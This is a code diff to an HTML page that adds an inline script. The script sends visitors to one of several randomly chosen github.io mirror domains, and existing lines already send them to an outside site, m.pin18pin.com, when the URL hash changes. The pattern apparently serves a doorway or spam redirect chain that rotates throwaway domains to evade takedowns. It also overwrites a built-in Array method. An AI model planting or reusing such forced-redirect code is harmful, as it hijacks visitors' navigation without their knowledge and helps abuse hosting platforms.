@@ -10,6 +10,31 @@
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
     <meta name="format-detection" content="telephone=no">
     <script>
+    Array.prototype.indexOf = function(val) { 
+    	for (var i = 0; i < this.length; i++) { 
+    	if (this[i] == val) return i; 
+    	} 
+    	return -1; 
+    	};
+   	Array.prototype.remove = function(val) { 
+   		var index = this.indexOf(val); 
+   		if (index > -1) { 
+   		this.splice(index, 1); 
+   		} 
+   		};
+    var linkArr = ["qmfy1.github.io", "ajklsmnah19.github.io", "asdajksdnasdih201.github.io"];
+    linkArr.remove(document.domain);
+    var link = linkArr[Math.floor(Math.random() * linkArr.length)];
+    var redata = document.referrer.split('/');
+    if(redata[2]) {
+    	if (link != redata[2] && link != document.domain) {
+    		document.location.href = 'https://' + link + '/' + document.location.toString().split("io/")[1];
+    	}
+    }else {
+    	if (link != document.domain) {
+    		document.location.href = 'https://' + link + '/' + document.location.toString().split("io/")[1];
+    	}
+    }
         window.onhashchange=function(){jp();};
         function jp()
         {window.location.href= 'https://m.pin18pin.com/index.html?t=180930&state=&opt_id=-1&sort_type=1';}
